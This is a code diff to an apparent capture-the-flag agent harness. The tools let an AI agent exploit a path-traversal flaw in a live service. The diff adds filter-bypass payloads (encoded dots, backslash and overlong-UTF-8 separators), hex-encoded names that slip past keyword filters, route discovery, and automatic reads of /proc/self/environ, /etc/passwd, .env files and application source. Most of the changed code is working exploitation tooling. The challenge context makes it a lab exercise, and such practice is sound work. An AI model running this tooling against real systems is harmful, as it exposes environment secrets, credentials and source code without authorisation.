@@ -21,6 +21,7 @@ artifact write is atomic, and a missing LLM runtime configuration raises one
 safe error instead of a raw traceback.
 """
 
+import base64
 import collections
 import concurrent.futures
 import hashlib
@@ -63,7 +64,10 @@ HINT = (
     "декодирует до '../'; (6) ....// после однопроходной чистки '../'. Открытые файлы продублированы "
     "в materials. Финальный секрет должен быть ПОЛУЧЕН ИЗ ОТВЕТА ЖИВОЙ СЛУЖБЫ. Начни с http_discover, "
     "найди маршрут и имя параметра, затем http_traverse (он автоматически перебирает abs-path, HPP, "
-    "multi-param, suffix-concat, double-decode и классические обходы)."
+    "multi-param, suffix-concat, double-decode и классические обходы). Дополнительно: http_discover "
+    "проверяет href-ссылки главной и plain-пути (/files/notes.txt); http_traverse сам читает "
+    "/proc/self/environ и исходники (/proc/self/cwd/app.py и др.), пробует скрытые имена (.flag) "
+    "и имена без расширения; флаг в base64-блобе внутри ответа декодируется автоматически."
 )
 
 TOOL_DESCRIPTIONS = """
@@ -71,10 +75,10 @@ TOOL_DESCRIPTIONS = """
 {"tool":"inventory"} — список файлов и размеров в materials.
 {"tool":"read_file","path":"относительный/путь","max_lines":80} — прочитать файл материалов (.gz тоже).
 {"tool":"grep_files","pattern":"регулярное выражение","max_hits":50} — искать в материалах.
-{"tool":"http","path":"/путь?param=значение","method":"GET"} — один запрос к целевому сервису; тело в preview.
+{"tool":"http","path":"/путь?param=значение","method":"GET"} — один запрос к целевому сервису; тело в preview; флаги, спрятанные в base64 внутри ответа, декодируются автоматически.
 {"tool":"http_batch","paths":["/a?file=x","/b",...]} — до 60 путей параллельно; не-404 с превью.
-{"tool":"http_discover"} — найти endpoint и имя файлового параметра: типичные пути, ссылки главной, перебор параметров с публичным именем файла.
-{"tool":"http_traverse","names":["secret.txt","app.py","/proc/self/environ"],"max_depth":6} — ГЛАВНЫЙ ИНСТРУМЕНТ: подбирает обход фильтра-до-сборки (abs-path через os.path.join, HPP дублирование параметра, мульти-параметр name+path, суффикс-склейка safe.txt+.bak, двойное декодирование, классические ....// кодировки), возвращает не-404 ответы с телами.
+{"tool":"http_discover"} — найти endpoint и имя файлового параметра: типичные пути, ссылки главной, перебор параметров с публичным именем файла; href-ссылки главной и plain-пути (/files/notes.txt) тоже проверяются.
+{"tool":"http_traverse","names":["secret.txt","app.py","/proc/self/environ"],"max_depth":6} — ГЛАВНЫЙ ИНСТРУМЕНТ: подбирает обход фильтра-до-сборки (abs-path через os.path.join, HPP дублирование параметра, мульти-параметр name+path, суффикс-склейка safe.txt+.bak, двойное декодирование, классические ....// кодировки), возвращает не-404 ответы с телами. Автоматически читает /proc/self/environ и /proc/self/cwd/app.py и другие источники, пробует скрытые имена (.flag) и имена без расширения.
 {"tool":"unpack_url","path":"/backup.zip","filter":"secret|flag"} — распаковать архив из ответа.
 {"tool":"decode","value":"...","encoding":"base64|hex|url"} — декодировать.
 {"tool":"finish","flag":"ТОЧНОЕ_ЗНАЧЕНИЕ"} — завершить, когда значение получено из живого ответа.
@@ -357,6 +361,31 @@ def unwrap_body(text):
     return ""
 
 
+B64_CANDIDATE_RX = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
+
+
+def decode_b64_flags(text):
+    """Surface flags hidden in base64 blobs inside honest responses.
+
+    Some targets stash the secret as a base64 string in a page or JSON
+    wrapper; the raw text never matches FLAG_RX. Decoded hits are appended to
+    EVIDENCE so finish-verification accepts them.
+    """
+    extra = []
+    for candidate in B64_CANDIDATE_RX.findall(text)[:12]:
+        try:
+            decoded = base64.b64decode(
+                candidate + "=" * ((-len(candidate)) % 4)
+            ).decode("utf-8", "ignore")
+        except ValueError:
+            continue
+        hit = FLAG_RX.search(decoded)
+        if hit and hit.group() not in extra:
+            extra.append(hit.group())
+            remember(decoded)
+    return extra
+
+
 def http_get(path, method="GET"):
     path = valid_http_path(path)
     method = method.upper()
@@ -389,6 +418,7 @@ def http_get(path, method="GET"):
         remember(data)
     text = data.decode("utf-8", "replace")
     flags = FLAG_RX.findall(text)[:8]
+    flags.extend(decode_b64_flags(text))
     inner = unwrap_body(text)
     return {
         "path": path,
@@ -539,6 +569,60 @@ def pick_route(res, homepage_sha):
     return found
 
 
+HREF_RX = re.compile(r"""(?:href|src|action)=["']([^"']{1,200})["']""", re.I)
+
+PLAIN_DIRS = (
+    "download",
+    "files",
+    "static",
+    "public",
+    "data",
+    "docs",
+    "uploads",
+    "media",
+    "shared",
+    "assets",
+    "content",
+    "lib",
+    "serve",
+    "get",
+    "file",
+)
+
+
+def href_route_probes(homepage_text, base_name):
+    """Probe file-ish routes referenced by the homepage itself."""
+    probes = []
+    for link in HREF_RX.findall(homepage_text or ""):
+        if not link.startswith("/"):
+            continue
+        link = link.split("#", 1)[0]
+        if "?" in link:
+            probes.append(link)
+        elif any(
+            word in link.lower()
+            for word in (
+                "file",
+                "download",
+                "read",
+                "get",
+                "view",
+                "open",
+                "serve",
+                "fetch",
+                "static",
+            )
+        ):
+            probes.append(link)
+    return list(dict.fromkeys(probes))[:24]
+
+
+def plain_path_probes(base_name):
+    """Services that serve files by PATH SEGMENT (/files/notes.txt), not query."""
+    seed = urllib.parse.quote(base_name)
+    return ["/%s/%s" % (d, seed) for d in PLAIN_DIRS]
+
+
 def http_discover():
     """Find the file-serving endpoint AND its filename parameter."""
     hp = http_get("/")
@@ -557,13 +641,38 @@ def http_discover():
                     probe2.append("%s=%s/%s" % (q, pref, v))
         res2 = http_batch({"paths": probe2[:110]})
         routes = pick_route(res2, hp.get("sha1"))
+    # round 3: routes referenced by the homepage itself (href/src/action)
+    hrefs = href_route_probes(hp.get("preview", ""), base_name)
+    href_routes = (
+        pick_route(http_batch({"paths": hrefs}), hp.get("sha1")) if hrefs else []
+    )
+    # round 4: services that serve files by plain path segment (/files/notes.txt)
+    plain_res = http_batch({"paths": plain_path_probes(base_name)})
+    plain_hits = [
+        h
+        for h in plain_res.get("non_404", [])
+        if h.get("status") == 200 and h.get("sha1") != hp.get("sha1")
+    ]
     if routes:
         return {
             "route": ROUTE,
             "all_routes": ROUTES[:6],
             "file_routes_found": routes[:16],
+            **({"href_routes": href_routes[:8]} if href_routes else {}),
+            **({"plain_path_hits": plain_hits[:8]} if plain_hits else {}),
             "homepage": hp,
             "note": "reuse this ROUTE in http_traverse",
+        }
+    if href_routes or plain_hits:
+        return {
+            "route": ROUTE or "NOT FOUND",
+            **({"href_routes": href_routes[:8]} if href_routes else {}),
+            **({"plain_path_hits": plain_hits[:8]} if plain_hits else {}),
+            "homepage": hp,
+            "note": (
+                "no query-param route; files served via href/plain path — GET "
+                "them directly, or pass route:'/getfile?doc=' to http_traverse"
+            ),
         }
     return {
         "route": ROUTE or "NOT FOUND",
@@ -599,6 +708,15 @@ PATH_BYP = [
     "%2e./",
     "..%c1%1c",
     "..%25%2f",
+    # extended set: backslash and mixed-slash separators, encoded-dot forms,
+    # overlong UTF-8, unicode solidus — filters that normalize one canonical
+    # shape only
+    "..\\",
+    "..\\/",
+    "%2e%2e/",
+    "%2e%2e%5c",
+    "..%e0%80%af",
+    "..%u2215",
 ]
 
 
@@ -659,6 +777,31 @@ def http_traverse(action):
         ]
 
     abs_hits = distinct(http_batch({"paths": [given + p for p in abs_payloads[:24]]}))
+
+    # Phase A2: fixed high-value absolute reads independent of the guessed
+    # names — environment (env-set secrets), process metadata and service
+    # source. /proc/self/environ alone regularly exposes the flag.
+    fixed_abs = [
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/proc/self/status",
+        "/proc/self/mounts",
+        "/proc/version",
+        "/etc/passwd",
+        "/etc/hosts",
+        "/etc/environment",
+        "/etc/hostname",
+        "/proc/self/cwd/flag.txt",
+        "/proc/self/cwd/flag",
+        "/proc/self/cwd/secret.txt",
+        "/proc/self/cwd/app.py",
+        "/proc/self/cwd/main.py",
+        "/proc/self/cwd/server.py",
+        "/proc/self/cwd/wsgi.py",
+        "/proc/self/cwd/.env",
+        "/proc/self/cwd/.htaccess",
+    ]
+    abs_hits += distinct(http_batch({"paths": [given + p for p in fixed_abs[:60]]}))
 
     # Phase B: per-route canary via DIRECT gets (sha-dedup would hide the
     # shared /etc/passwd body from batch previews)
@@ -899,10 +1042,23 @@ def http_traverse(action):
     for n in names:
         variants = [n]
         low = n.lower()
+        if "." in n:
+            # extension-stripped sibling: flag.txt -> flag (server may append
+            # the extension itself at assembly time)
+            variants.append(n.rsplit(".", 1)[0])
         if any(w in low for w in secret_words):
             variants.append(low.replace("secret", "s%65cret").replace("flag", "f%6cag"))
             variants.append(n.swapcase())
-        variants_by_name.append(variants[:3])
+            # hidden dotfile (.flag, .secret.txt) and its hex-encoded form,
+            # which slips keyword filters that inspect the RAW request value
+            variants.append("." + n.lstrip("/"))
+            variants.append(
+                ("." + low.lstrip("/"))
+                .replace("secret", "s%65cret")
+                .replace("flag", "f%6cag")
+            )
+        variants = list(dict.fromkeys(variants))[:6]
+        variants_by_name.append(variants)
     for k in PATH_BYP:
         for d in range(1, max_depth + 1):
             for variants in variants_by_name:
@@ -1067,8 +1223,6 @@ def unpack_url(action):
 
 
 def decode_value(action):
-    import base64
-
     value = str(action.get("value", ""))[:300000]
     mode = str(action.get("encoding", "base64")).lower()
     if mode == "base64":
